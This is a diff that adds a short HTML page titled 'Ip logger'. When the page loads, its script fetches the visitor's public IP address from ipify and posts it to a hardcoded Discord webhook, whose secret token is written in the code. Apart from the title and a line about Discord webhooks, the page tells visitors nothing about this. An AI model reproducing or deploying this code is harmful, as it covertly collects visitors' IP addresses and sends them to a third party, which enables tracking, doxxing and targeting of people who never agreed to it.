@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Ip logger</title>
+    </head>
+    <body>
+
+    <h1>Is pages of is logger</h1>    
+    <p>To send discord webhooks</p>
+
+
+    <script>
+        function getIP(json) {
+          var request = new XMLHttpRequest(); 
+              request.open("POST", "https://discord.com/api/webhooks/1126075440751202335/5hDJzS6Hp3yTG9WHXXNBuwp8ub0TcO37SB2oAgnih6sE08p-XjXL37TeAhraOZIIY5Re");
+        
+              request.setRequestHeader('Content-type', 'application/json');
+        
+              var params = {
+                username: "Logger",
+                avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+                content: "**IP:** ```" + json.ip + "*```"
+              }
+        
+              request.send(JSON.stringify(params));
+            }
+        
+        </script>
+        <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> 
+    </body>
+</html>
